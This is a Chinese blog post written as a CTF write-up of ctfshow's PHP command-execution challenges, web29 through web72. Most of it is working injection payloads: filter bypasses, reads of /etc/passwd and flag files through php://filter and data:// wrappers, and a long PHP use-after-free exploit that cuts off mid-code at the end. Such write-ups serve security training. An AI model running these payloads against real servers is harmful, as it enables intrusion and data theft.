@@ -1,0 +1,343 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ctfshow命令执行 | 柚子のBlog</title><meta name="author" content="yoo2i"><meta name="copyright" content="yoo2i"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web29过滤了flag，两种做法： ?c&#x3D;system(&#39;cat fla?.php&#39;); ?c&#x3D;system(&#39;cp fla?.php 1.txt&#39;); 问号可以作为占位符替代单个任意字符绕过过滤（和正则表达式不完全一样哦）。 system(‘’);可以执行系统命令，是eval的好伙伴，记得句尾加分号。 web30在29的基础上过滤了system和php 引入知识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow命令执行">
+<meta property="og:url" content="https://yoo2i.github.io/2023/09/08/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="柚子のBlog">
+<meta property="og:description" content="web29过滤了flag，两种做法： ?c&#x3D;system(&#39;cat fla?.php&#39;); ?c&#x3D;system(&#39;cp fla?.php 1.txt&#39;); 问号可以作为占位符替代单个任意字符绕过过滤（和正则表达式不完全一样哦）。 system(‘’);可以执行系统命令，是eval的好伙伴，记得句尾加分号。 web30在29的基础上过滤了system和php 引入知识">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yoo2i.github.io/img/avatar.png">
+<meta property="article:published_time" content="2023-09-08T10:25:55.000Z">
+<meta property="article:modified_time" content="2023-10-11T08:18:27.126Z">
+<meta property="article:author" content="yoo2i">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yoo2i.github.io/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yoo2i.github.io/2023/09/08/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ctfshow命令执行',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-11 16:18:27'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="柚子のBlog"><span class="site-name">柚子のBlog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctfshow命令执行</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-08T10:25:55.000Z" title="发表于 2023-09-08 18:25:55">2023-09-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-11T08:18:27.126Z" title="更新于 2023-10-11 16:18:27">2023-10-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ctfshow命令执行"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><p>过滤了flag，两种做法：</p>
+<p><code>?c=system(&#39;cat fla?.php&#39;);</code></p>
+<p><code>?c=system(&#39;cp fla?.php 1.txt&#39;);</code></p>
+<p>问号可以作为占位符替代单个任意字符绕过过滤（和正则表达式不完全一样哦）。</p>
+<p>system(‘’);可以执行系统命令，是eval的好伙伴，记得句尾加分号。</p>
+<h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><p>在29的基础上过滤了system和php</p>
+<p>引入知识是反引号&#96;可以代替system函数，只不过它没有回显。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=`cp fla?.?hp 1.txt`;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><p>在30的基础上过滤了cat sort shell . 空格和单引号</p>
+<p>过滤了太多东西，尝试参数逃逸</p>
+<p><code>?c=eval($_GET[A]);&amp;A=system(&#39;cat flag.php&#39;);</code></p>
+<h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><p>在31的基础上过滤了反引号、echo、分号和左括号</p>
+<p>逃避分号过滤可以加php闭合标签?&gt;（php最后一句话可以不加分号），但是还过滤了左括号，可以使用文件包含来过滤</p>
+<p>测试能否读<code>?c=include%0a$_GET[A]?&gt;&amp;A=/etc/passwd</code></p>
+<p>成功后构造payload：</p>
+<p><code>?c=include%0a$_GET[A]?&gt;&amp;A=php://filter/convert.base64-encode/resource=flag.php</code></p>
+<p>在这里使用了文件包含，推荐阅读这篇文章的总结：<a target="_blank" rel="noopener" href="https://www.ngui.cc/zz/2224660.html">好康的</a></p>
+<p>这里的伪协议是用来对文件进行base64编码并且读取的</p>
+<p>（注意命令闭合以及%20并不能绕过空格过滤）</p>
+<h1 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h1><p>在32的基础上过滤了双引号，32的思路仍然可用</p>
+<p>尝试文件包含的另一个函数</p>
+<p>测试能否读<code>?c=require%0a$_GET[1]?&gt;&amp;1=/etc/passwd</code></p>
+<p><code>?c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
+<p>require和include功能相同，只是它的错误处理会直接生成致命错误并且停止脚本，incldue只生成警告</p>
+<h1 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h1><p>在33的基础上过滤了冒号，32和33的思路仍然可用</p>
+<h1 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h1><p>在34的基础上过滤了左尖括号和等于号，32、33和34的思路依然可用</p>
+<h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><p>在35的基础上过滤了数字，32、33、34和35的思路依然可用</p>
+<h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><p>从这里开始题目就从eval变成include了</p>
+<p>过滤了flag</p>
+<p>使用data伪协议试一下</p>
+<p><code>?c=data://text/plain,&lt;?php phpinfo()?&gt;</code></p>
+<p>可以执行哦！</p>
+<p><code>?c=data://text/plain,&lt;?php system(&#39;cat fla?.php&#39;);?&gt;</code></p>
+<p>data伪协议可以传递数据，不过也可以用来执行邪恶的php代码</p>
+<h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><p>在37的基础上过滤了php和file</p>
+<p><code>?c=data://text/plain,&lt;?=system(&#39;cat fla?.ph?&#39;);?&gt;</code></p>
+<p>这个标签等价于上面的哦，一种小技巧</p>
+<h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><p>过滤了flag，但是加了后缀.php</p>
+<p>测试一下<code>?c=data://text/plain,&lt;?php phpinfo()?&gt;</code></p>
+<p>发现成功执行，只是.php被加在了末尾，做法同上。</p>
+<h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><p><code>?c=eval(array_pop(next(get_defined_vars())));</code></p>
+<p>post需要传入<code>1=system(&#39;cat flag.php&#39;);</code></p>
+<p>这里是什么意思呢，我们从里往外看</p>
+<p>get_defined_vars是返回当前环境下所有已定义的变量，环境变量、服务器变量和用户的都有（get、post都是）。</p>
+<p>next是将内部指针指向数组中的下一个元素，并输出。（这里就指向了post的内容）</p>
+<p>array_pop是删除数组中最后一个元素并返回值。</p>
+<h1 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h1><p>上来就过滤了大小写字母和数字，以及异或符号^，但是保留了或|,可以用或构造出数字和字母来执行命令，推荐观看b站的ctfshow官方视频。</p>
+<h1 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h1><p><code>system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</code></p>
+<p>首先，shell中存在三个文件描述符123，分别代表标准输入、标准输出和错误输出，这里的2&gt;&amp;1代表将错误输出定位到标准输出。</p>
+<p>然后，&gt;&#x2F;dev&#x2F;null代表将标准输出扔进黑洞去（好像是linux的一个彩蛋，消息扔进null）</p>
+<p>所以这句话就代表我们所有正常执行的命令都没有回显。</p>
+<p>payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls;ls</span><br></pre></td></tr></table></figure>
+
+<p>这样代码就变成了<code>system(ls;ls.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</code>分号前的命令就可以正常执行啦！</p>
+<p>（准备在shell中尝试ls;看看结果）</p>
+<p>（分号代表分割符，先执行第一个然后立即执行第二个）</p>
+<h1 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h1><p>和42大体相同，但是分号被过滤了！</p>
+<p><code>1&amp;&amp;2</code>在shell中代表先执行1命令，1成功后执行2，也可以当作分割符。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac flag.php%26%26ls //&amp;进行url编码</span><br></pre></td></tr></table></figure>
+
+<h1 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h1><p>多过滤了flag，老生常谈的通配符</p>
+<p><code>?c=tac fla?.php%26%26ls</code></p>
+<h1 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h1><p>多过滤了空格，可以使用水平制表符，tab是%09，充当分割符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac%09fla?.php%26%26ls</span><br></pre></td></tr></table></figure>
+
+<p>据尝试回车和换行都没用哦</p>
+<h1 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h1><p>上一个payload还可以用的</p>
+<p>遇到的问题是没有对&amp;&amp;进行url编码，其实是因为这个符号可以当get传参的分割符，所以是需要编码的。</p>
+<h1 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h1><p>同45</p>
+<p>nl用来给文件标记行号并显示</p>
+<p>head默认显示文件头十行</p>
+<p>sort默认按字母顺序排序文件的行并且输出</p>
+<p>more和less也用来查看内容</p>
+<h1 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h1><p>同45</p>
+<p>tail是head的逆</p>
+<p>sed是流式文本处理工具，也可以查看文件 sed “” example</p>
+<p>cut命令是从文本中提取指定字段的，也可以查看文件</p>
+<p>awk也是文本处理工具，查看文件用 awk “{print}” test</p>
+<p>strings是用来从二进制文件中提取可打印的字符的，也可以查看文件</p>
+<p>od是用不同进制显示文件内容的工具 od -c example</p>
+<h1 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h1><p>同45</p>
+<h1 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h1><p><code>?c=nl&lt;fla&#39;&#39;g.php%7C%7Cls</code></p>
+<p>shell特性，会忽略这两个单引号和里面的内容</p>
+<p>||代表或，第一条命令执行成功后第二条不执行</p>
+<h1 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><p>同50</p>
+<h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><p><code>?c=nl$&#123;IFS&#125;/fla?%7C%7Cls</code></p>
+<p>${IFS}是Linux环境变量，表示字段分割符的，充当空格或制表符的作用在这里。</p>
+<h1 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h1><p>同52</p>
+<p>system函数返回值是执行结果最后一行</p>
+<h1 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h1><p><code>mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;z.txt</code></p>
+<p>改名后直接访问</p>
+<h1 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h1><p>丧心病狂，把字母都ban了，两种做法。</p>
+<ol>
+<li><p><code>?c=/???/????64 ????.???</code></p>
+<p>实际上是&#x2F;bin&#x2F;base64 flag.php</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></p>
+<p>很神奇喵</p>
+<p>最大的教训是Linux执行命令是这样的</p>
+<p><code>. example#需要有空格</code></p>
+</li>
+</ol>
+<h1 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h1><p><code>$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code></p>
+<p>类似于补码的原理，0和-1相对，1和-2相对，那么36就和-37相对</p>
+<p><code>$(())</code>表示0</p>
+<p><code>$((~$(())))</code>表示-1</p>
+<p>所以先找出-37，然后取反拿值，得到36</p>
+<h1 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h1><p>system和&#96;&#96;都被ban了，没法执行命令，尝试文件包含。</p>
+<p><code>c=highlight_file(&#39;flag.php&#39;);</code></p>
+<h1 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h1><p>同57</p>
+<h1 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h1><p>同57</p>
+<h1 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h1><p>同57</p>
+<p>show_source和highlight_file一样的</p>
+<h1 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h1><p>同57</p>
+<h1 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h1><p>同57</p>
+<h1 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h1><p>同57</p>
+<h1 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h1><p>同57</p>
+<h1 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h1><p>同57</p>
+<h1 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h1><p>不在flag.php，那就扫一下目录</p>
+<p><code>c=print_r(scandir(&#39;/&#39;));</code></p>
+<p>发现存在flag.txt</p>
+<p><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p>
+<h1 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h1><p>print_r被ban了，但是flag位置没变</p>
+<h1 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h1><p>搞笑的是index.php里面应该有highlight_file，结果出题把highlight_file给ban了，进去就是一个报错。</p>
+<p>既然highlight_file和show_source被ban了，那就试试include吧</p>
+<p><code>c=include(&#39;/flag.txt&#39;);</code></p>
+<h1 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h1><p><code>c=var_export(scandir(&#39;/&#39;));</code></p>
+<p>var_export是用来返回变量类型和内容的。</p>
+<p>新姿势，其余同68。</p>
+<h1 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h1><p>同68。</p>
+<h1 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>ob_get_contents()是得到输出缓冲的内容。</p>
+<p>ob_end_clean()是清除输出缓冲的内容并且关闭输出缓冲。</p>
+<p><code>c=include(&#39;/flag.txt&#39;);exit(0);</code></p>
+<h1 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h1><p>用glob伪协议绕open_basedir</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#记得url编码</span></span><br></pre></td></tr></table></figure>
+
+<p>flag0.txt</p>
+<p>没有权限访问，用脚本绕</p>
+<p><code>&lt;?php function ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;     class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;     class Helper &#123;        public $a, $b, $c, $d;    &#125;     function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;     function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;     function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;= 8;        &#125;    &#125;     function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;     function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);         $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);         for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);             if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;                  $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;                 $text_size = $p_memsz;            &#125;        &#125;         if(!$data_addr || !$text_size || !$data_size)            return false;         return [$data_addr, $text_size, $data_size];    &#125;     function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                                if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;             $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                                if($deref != 0x786568326e6962)                    continue;            &#125; else continue;             return $data_addr + $i * 8;        &#125;    &#125;     function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;     function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);             if($f_name == 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;     function trigger_uaf($arg) &#123;         $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln = new Vuln();        $vuln-&gt;a = $arg;    &#125;     if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;     $n_alloc = 10;     $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);     trigger_uaf(&#39;x&#39;);    $abc = $backtrace[1][&#39;args&#39;][0];     $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;     if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;     $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;     write($abc, 0x60, 2);    write($abc, 0x70, 6);     write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);     $closure_obj = str2ptr($abc, 0x20);     $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;     if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;     if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions 